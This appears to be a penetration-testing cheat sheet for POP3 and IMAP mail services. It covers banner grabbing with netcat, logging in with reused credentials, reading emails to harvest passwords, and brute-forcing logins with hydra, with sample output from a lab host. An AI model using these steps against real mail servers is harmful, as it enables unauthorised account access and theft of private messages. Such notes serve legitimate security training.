# POP3 (110/995) / IMAP (143/993)

### Banner grab

```bash
nc -nv $IP 110
nc -nv $IP 143
```

> Version info

**Why:** Check for exploits

<details>
<summary>Example Output</summary>

```
telnet 10.10.10.5 110
+OK Dovecot POP3 ready <1234.abc@target>

telnet 10.10.10.5 143
* OK [CAPABILITY IMAP4rev1] Dovecot IMAP ready
(Check version: Dovecot 2.2.x has known auth bypass CVEs)
```
</details>

---

### Login with found creds

```bash
telnet $IP 110
USER <user>
PASS <pass>
```

> Try creds from other services

**Why:** Read emails for more creds

<details>
<summary>Example Output</summary>

```
telnet 10.10.10.5 110
+OK POP3 server ready
USER admin
+OK
PASS admin123
+OK Logged in.
LIST
1 1024
2 2048
(2 emails to read)
```
</details>

---

### List and read emails

```bash
LIST
RETR 1
RETR 2
```

> After POP3 login

**Why:** Emails often contain passwords

<details>
<summary>Example Output</summary>

```
RETR 1
From: sysadmin@corp.local
Subject: New server credentials

Hi, the new server password is: Summer2024!
Please change it ASAP.
(CREDENTIALS IN EMAIL)
```
</details>

---

### Brute force

```bash
hydra -l <user> -P passwords.txt $IP pop3
```

> If you have a username

**Why:** Weak mail passwords

<details>
<summary>Example Output</summary>

```
hydra -l admin -P rockyou.txt 10.10.10.5 pop3
[110][pop3] login: admin password: welcome1

hydra -l admin -P rockyou.txt 10.10.10.5 imap
[143][imap] login: admin password: welcome1
(Now read their emails for creds/info)
```
</details>

---
